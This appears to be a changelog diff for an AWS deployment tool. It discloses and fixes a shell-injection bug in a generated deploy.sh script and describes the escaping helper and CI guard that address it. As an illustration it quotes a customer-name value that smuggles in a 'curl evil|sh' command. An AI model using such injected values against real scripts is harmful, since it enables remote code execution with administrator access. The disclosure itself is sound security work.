@@ -6,6 +6,16 @@ All notable changes to the MAP 2.0 Auto-Tagger.
 
 ## v20 — Resilient SQS Pipeline + Open Source
 
+### v20.5.2 — Security: generator-side shell-injection fix (PR #46)
+
+**Security class: supply-chain RCE.** Severity: high. No runtime Lambda change; the YAML template is byte-identical to v20.5.1. Customers who already deployed are NOT affected. Customers generating a fresh `deploy.sh` should re-download from the configurator before next deploy.
+
+**The bug (U4):** `configurator.html` emitted the customer-name field into the generated `deploy.sh` as `CUSTOMER="${customerDisplay}"`, inside double quotes. The JS-side escape only neutralized single quotes. In double-quoted bash, `$(...)`, backticks, `\`, and `$VAR` all still expand. A partner-supplied customer name like `Acme $(curl evil|sh) Corp` would execute the subshell when the customer pasted the generated script into CloudShell — arbitrary code at AdministratorAccess on the customer's management account.
+
+**The fix:** customer-name now emits as `CUSTOMER=${customerDisplay}` (no surrounding quotes) where `customerDisplay` is the output of a `shellSingleQuote` helper that wraps the value in single quotes and escapes embedded single quotes via the canonical `'\''` close-insert-reopen pattern. CR/LF are stripped so a newline cannot escape a shell comment either. Applies to both the single-account and multi-account deploy.sh generators.
+
+**Guardrail:** new Layer 1 CI check `Shell Injection Guard` (`lint_shell_injection.py`) fails the build if the double-quoted customer-value shape is reintroduced. Verified against the regression — reintroducing `CUSTOMER="${customerDisplay}"` fails the check on both emit sites.
+
 ### v20.5.1 — Hygiene fixes (SSM TTL, events:TagResource, ConfigParameter output)
 
 Three independent correctness fixes (PR #44). No new capability — tightens existing code against latent failure classes.
